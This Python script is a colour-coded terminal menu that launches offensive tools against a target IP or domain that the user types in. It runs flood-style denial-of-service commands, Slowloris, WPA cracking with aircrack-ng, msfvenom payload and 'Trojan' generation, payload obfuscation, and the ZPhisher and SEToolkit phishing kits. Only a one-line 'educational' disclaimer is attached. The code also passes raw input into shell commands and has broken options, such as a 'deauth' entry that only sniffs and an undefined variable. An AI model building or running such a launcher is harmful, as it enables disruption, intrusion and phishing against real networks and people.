import os
import random
import pyfiglet

def clear_screen():
    os.system("clear")

def introduction():
    yellow = "\033[1;38;5;154m"
    print(f"""{yellow}                _______ 
               |                                            \      |
               |                                            | \     |
               |______     _____    ____       ____ _____   |  \    |   ____ _____             ____    ____
               | |       | ___|  |____|  |    |    \    | |       |    \        / |    | | ___| | /  
               | |       | \    |  |        |    |    \  | |--     |    \  /\  /  | |  | | \    |/   
         _______ | |_____  |  \   |  |        |    |     \ | |____   |     \/  \/   |____| |  \   | \  
    """)
             
    print("=======================================================")
    print(f"{yellow}Welcome to your Official Network Script!")
    print("Use this tool only for educational and security testing!")
    print("======================================================\n")
    input("Press Enter to start the adventure...")

def install_dependencies():
    print("Updating system packages in progress...")
    os.system("sudo apt update && sudo apt upgrade -y")

    print("\nInstalling basic tools and essential dependencies...")
    base_tools = ["git", "curl", "wget", "xterm", "python3-pip", "net-tools", "iputils-ping"]
    for tool in base_tools:
        os.system(f"sudo apt install {tool} -y")

    print("\nInstalling all advanced security tools...")
    tools = [
        "nmap", "wireshark", "airgeddon", "wifite", "ettercap-common", "ettercap-text-only", 
        "metasploit-framework", "speedtest-cli", "whatweb", "bettercap", "tor", "hping3", "seclists", "hydra", "thc-ssl-dos"
    ]
    
    for tool in tools:
        print(f"Installing {tool}...")
        os.system(f"sudo apt install {tool} -y")
        
    print("\nAwesome! All dependencies and tools have been successfully installed!")

def print_ascii():
    ascii_art = pyfiglet.figlet_format("MENU    OPTIONS")
    print(ascii_art)

def get_target():
    return input("Enter the target IP or Domain (e.g., 192.168.1.1 or example.com): ")

def menu():
    reset = "\033[1;0m"
    yellow = "\033[1;38;5;154m"
    violet = "\033[1;35m"
    skyblue = "\033[1;36m"
    violetscure = "\033[1;31m"

    print_ascii()
    print(f"""\n{violet}Choose an option: 
{reset}[{yellow}00{reset}]{yellow} My Public IP                 {reset}[{yellow}aa{reset}]{yellow} Open Apps Menu
{reset}[{yellow}01{reset}]{yellow} My Private IP                {reset}[{yellow}bb{reset}]{yellow} Open Nmap Scan Menu
{reset}[{yellow}02{reset}]{yellow} Start NetworkManager         {reset}[{yellow}cc{reset}]{yellow} Open Metadata Menu
{reset}[{yellow}03{reset}]{yellow} Restart NetworkManager       {reset}[{yellow}dd{reset}]{yellow} Open MsfVenom Menu
{reset}[{yellow}04{reset}]{yellow} Stop NetworkManager          {reset}[{yellow}ee{reset}]{yellow} Create Trojan / Test
{reset}[{yellow}05{reset}]{yellow} Current Directory (ls/pwd)   {reset}[{yellow}ff{reset}]{yellow} Open Aircrack-ng Menu
{reset}[{yellow}06{reset}]{yellow} Install/Update Everything    {reset}[{yellow}gg{reset}]{yellow} Open Attack DOS Menu 
{reset}[{yellow}07{reset}]{yellow} Network SpeedTest            {reset}[{yellow}hh{reset}]{yellow} Open Obfuscation Menu
{reset}[{yellow}08{reset}]{yellow} Full System Upgrade          
 
{reset}[{yellow}t1{reset}]{yellow} Start Tor                    {reset}[{yellow}1{reset}]{yellow} Traceroute
{reset}[{yellow}t2{reset}]{yellow} Tor Status                   {reset}[{yellow}2{reset}]{yellow} Ping Test 
{reset}[{yellow}t3{reset}]{yellow} Stop Tor                     {reset}[{yellow}3{reset}]{yellow} Whois Info 
{reset}[{yellow}t4{reset}]{yellow} Enable Tor at boot           {reset}[{yellow}4{reset}]{yellow} Change Target IP/Domain 
{reset}[{yellow}t5{reset}]{yellow} Disable Tor at boot          {reset}[{yellow}5{reset}]{yellow} Neofetch Info
                                                    
                                               
{reset}0){violetscure} Exit app""")
    
    dynamic_prompts = ["ScriptNetwork", "SN", "SNPython"]
    chosen_prompt = random.choice(dynamic_prompts)
    
    return input(f"\n{yellow}[{skyblue}{chosen_prompt}{yellow}]{yellow}--[{reset}~{yellow}]-[{violet}Menu{yellow}]> {reset}")

def dos_menu(target):
    while True:
        clear_screen()
        print("\n---- DOS Attack Menu ----")
        print("1) Open Basic DoS Menu")
        print("2) Ping Flood Dos")
        print("3) Nping Dos")
        print("4) Hping Dos")
        print("5) Advanced Dos")
        print("6) Slowloris.py")
        print("7) Metasploit-Slowloris")
        print("0) Go Back")

        scelta = input("\n[Menu]: ")

        if scelta == "7":
            os.system("python3 .MetaSlow.py")
        elif scelta == "6":
            os.system(f"xterm -fa 'Monospace' -fs 12 -e 'cd .DOS && python3 slowloris.py {target}' &")
        elif scelta == "5":
            os.system("xterm -fa 'Monospace' -fs 12 -e 'cd .DOS && python3 Dos.py' &")
        elif scelta == "4":
            os.system(f"xterm -fa 'Monospace' -fs 12 -e 'hping3 --udp -p 53 {target}' &")
        elif scelta == "3":
            os.system(f"xterm -fa 'Monospace' -fs 12 -e 'nping --tcp -p 53 --rate 100000000 --count 0 {target}' &")
        elif scelta == "2":
            os.system(f"xterm -fa 'Monospace' -fs 12 -e 'ping -f -s 65000 -i 0.02 {target}' &")
        elif scelta == "1":
            os.system("cd .DOS && python3 dos.py")
        elif scelta == "0":
            break
        input("\nPress Enter to continue...")

def aircrack_menu():
    interface = select_interface()

    while True:
        clear_screen()
        print("\n--- Aircrack-ng Menu ---")
        print("1) Monitor Mode")
        print("2) Start Airodump-ng")
        print("3) Deauth Attack (Aireplay-ng)")
        print("4) Crack WPA/WPA2")
        print("0) Go Back")
        
        scelta = input("\n[Menu]: ")

        if scelta == "1":
            os.system(f"sudo ip link set {interface} down")
            os.system(f"sudo iw dev {interface} set type monitor")
            os.system(f"sudo ip link set {interface} up")
            print(f"\nInterface {interface} is now in monitor mode!")
        elif scelta == "2":
            os.system(f"sudo airodump-ng {interface}")
        elif scelta == "3":
            target_bssid = input("Enter target BSSID: ")
            target_channel = input("Enter target channel: ")
            os.system(f"sudo airodump-ng --bssid {target_bssid} -c {target_channel} {interface}")
        elif scelta == "4":
            cap_file = input("Enter path to .cap file: ")
            wordlist = input("Enter path to wordlist: ")
            os.system(f"sudo aircrack-ng -w {wordlist} -b {target_bssid} {cap_file}")
        elif scelta == "0":
            break
        else:
            print("Invalid choice!")

        input("\nPress Enter to continue...")

def select_interface():
    os.system("ip link show")
    return input("\nEnter your network interface name (e.g., wlan0 or eth0): ")

def sub1(target):
    while True:
        yellow = "\033[1;38;5;154m"
        print(f"{yellow}1) Generate MsfVenom Payload")
        print(f"{yellow}2) Show Directory")
        print(f"{yellow}3) Clear Screen")
        print(f"{yellow}4) Open Viper Obfuscation")
        print(f"{yellow}0) Go Back")

        scelta = input("\n[Menu]: ")
     
        if scelta == "4":
            os.system("python3 .Viper.py")
        elif scelta == "3":
            os.system("clear")
        elif scelta == "2":
            os.system("pwd && ls")
        elif scelta == "1":
            os.system("python3 .MsfVenom.py")
        elif scelta == "0":
            break

def subb(target):
    while True:
        yellow = "\033[1;38;5;154m"
        print(f"{yellow}1) Show Attacker")
        print(f"{yellow}2) Show Victim")
        print(f"{yellow}3) Execute Attack")
        print(f"{yellow}4) Show Directory")
        print(f"{yellow}5) Clear Screen")
        print("0) Go Back")
        
        scelta = input("\n[Menu]: ")

        if scelta == "5":
            os.system("clear")
        elif scelta == "4":
            os.system("ls && pwd")
        elif scelta == "3":
            os.system("cd .recuperate && python3 attacco.py")
        elif scelta == "1":
            os.system("cat .recuperate/attacco.txt")
        elif scelta == "2":
            os.system("cat .recuperate/vittima.txt")
        elif scelta == "0":
            break
    
def submenu(target):
    while True: 
        yellow = "\033[1;38;5;154m"
        print(f"{yellow}1) Extract Metadata")
        print("2) Show Directory")
        print("3) GPS Metadata Info")
        print("4) Clear Screen")
        print("0) Go Back")
        
        scelta = input("\n[Menu]: ")

        if scelta == "4":
            os.system("clear")
        elif scelta == "3":
            os.system("cd .recuperate && sudo python3 GPS_info.py")
        elif scelta == "2":
            os.system("ls && pwd")
        elif scelta == "1":
            os.system("cd .recuperate && sudo python3 meta.py")
        elif scelta == "0":
            break

def submenu2open(target):
    while True:
        clear_screen()
        yellow = "\033[1;38;5;154m"
        print("\n--- Nmap Scan Menu ---")
        print(f"{yellow}1) Search Vulnerabilities (Vuln)")
        print("2) Search Open Ports")
        print("3) Operating System Detection")
        print("4) TCP Scan")
        print("5) Aggressive Scan")
        print("6) UDP Scan")
        print("0) Go Back")
        
        scelta = input("\n[Menu]: ")

        if scelta == "6":
            os.system(f"nmap -Pn -sU {target}")
        elif scelta == "5":
            os.system(f"nmap -Pn -A {target}")
        elif scelta == "4":
            os.system(f"nmap -Pn -sT {target}")
        elif scelta == "1":
            os.system(f"nmap -Pn -sV --script=vuln -T4 --min-rate=50 {target}")
        elif scelta == "2":
            os.system(f"nmap -Pn {target}")
        elif scelta == "3":
            os.system(f"nmap -Pn -O {target}")
        elif scelta == "0":
            break
        else:
            print("Invalid choice!")

        input("\nPress Enter to continue...")
         
def submenu_open(target):
    while True:
        clear_screen()
        yellow = "\033[1;38;5;154m"
        print("\n--- Network Apps Menu ---")
        print(f"{yellow}1) Open Airgeddon")
        print("2) Open Wifite")
        print("3) Open Wireshark")
        print("4) Open Metasploit-Framework")
        print("5) Open Bettercap")
        print("6) Open Maltego")
        print("7) Open ZPhisher")
        print("8) Open Xterm")
        print("9) Open Setoolkit")
        print("0) Go Back")

        scelta = input("\n[Menu]: ")

        if scelta == "9":
            os.system("setoolkit")
        elif scelta == "8":
            os.system("xterm -e &")
        elif scelta == "7":
            os.system("cd .recuperate/zphisher && bash zphisher.sh")
        elif scelta == "6":
            os.system("xterm -e 'maltego' &")
        elif scelta == "1":
            os.system("xterm -fa 'Monospace' -fs 12 -e 'airgeddon' &")
        elif scelta == "2":
            os.system("xterm -fa 'Monospace' -fs 12 -e 'wifite' &")
        elif scelta == "3":
            os.system("xterm -e 'wireshark' &")
        elif scelta == "4":
            os.system("xterm -fa 'Monospace' -fs 12 -e 'msfconsole' &")
        elif scelta == "5":
            os.system("xterm -fa 'Monospace' -fs 12 -e 'bettercap' &")
        elif scelta == "0":
            break
        else:
            print("Invalid choice!")
        
        input("\nPress Enter to continue...")

def main():
    clear_screen()
    introduction()
    clear_screen()
        
    target = get_target()

    while True:
        clear_screen()
        print(f"Current Target: {target}")
        choice = menu()

        if choice == "hh":
            os.system("cd .DSViper && python3 DSViper.py")
        elif choice == "gg":
            dos_menu(target)
        elif choice == "t5":
            os.system("systemctl disable tor")
        elif choice == "t4":
            os.system("systemctl enable tor")
        elif choice == "t1":
            os.system("systemctl start tor")
        elif choice == "t2":
            os.system("systemctl status tor")
        elif choice == "t3":
            os.system("systemctl stop tor")
        elif choice == "ff":
            aircrack_menu()
        elif choice == "ee":
            subb(target)
        elif choice == "dd":
            sub1(target)
        elif choice == "cc":
            submenu(target)
        elif choice == "bb":
            submenu2open(target)
        elif choice == "5":
            os.system("neofetch")
        elif choice == "00":
            os.system("curl ifconfig.me")
        elif choice == "08":
            os.system("sudo apt update && sudo apt upgrade -y")
        elif choice == "01":
            os.system("ip a")
        elif choice == "05":
            os.system("pwd && ls")
        elif choice == "02":
            os.system("systemctl start NetworkManager")
        elif choice == "03":
            os.system("systemctl restart NetworkManager")
        elif choice == "04":
            os.system("systemctl stop NetworkManager")
        elif choice == "06":
            install_dependencies()
        elif choice == "3":
            os.system(f"whois {target}")
        elif choice == "07":
            os.system("speedtest-cli")
        elif choice == "2":
            os.system(f"ping -c 4 {target}")
        elif choice == "1":
            os.system(f"traceroute {target}")
        elif choice == "4":
            target = get_target()
        elif choice == "aa":
            submenu_open(target) 
        elif choice == "0":
            print("Exiting app... Goodbye!")
            break
        else:
            print("Invalid choice or ignored command!")

        input("\nPress Enter to return to the menu...")

if __name__ == "__main__":
    main()
